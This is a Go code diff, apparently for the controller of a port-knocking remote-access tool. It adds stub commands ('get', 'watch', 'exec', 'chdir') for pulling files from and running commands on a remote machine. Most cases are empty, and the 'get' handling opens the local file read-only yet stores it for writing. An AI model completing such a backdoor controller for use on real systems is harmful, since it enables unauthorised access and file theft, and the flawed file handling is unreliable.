@@ -15,6 +15,11 @@ type cookieHandler struct {
 	responses chan string
 }
 
+var (
+	fileMap = make(map[int]io.Writer)
+	fileicr = 0
+)
+
 func main() {
 
 	// grab ports to port knock on from command line
@@ -109,12 +114,39 @@ func acceptCommandFromStdin(acceptedCommand chan string) {
 			panic(err)
 		}
 
-		acceptedCommand <- strings.TrimSpace(string(line))
+		splitCommands := strings.Split(strings.TrimSpace(string(line)), " ")
+
+		switch splitCommands[0] {
+		case "get":
+			if len(splitCommands) != 3 {
+				print("useage: get <remotefile> <localfile>")
+				continue
+			}
+
+			file, err := os.Open(splitCommands[2])
+			if err != nil {
+				print("file opening failed")
+				continue
+			}
+			fileMap[fileicr] = file
+			fileicr++
+
+		case "watch":
+		case "exec":
+		case "chdir":
+		default:
+
+		}
+
+		//acceptedCommand <-
 
 	}
 }
 
 func handleResponse(channelResponses chan string) {
+
+	//write a map of concurrent filehandles
+
 	for {
 
 		println(<-channelResponses)
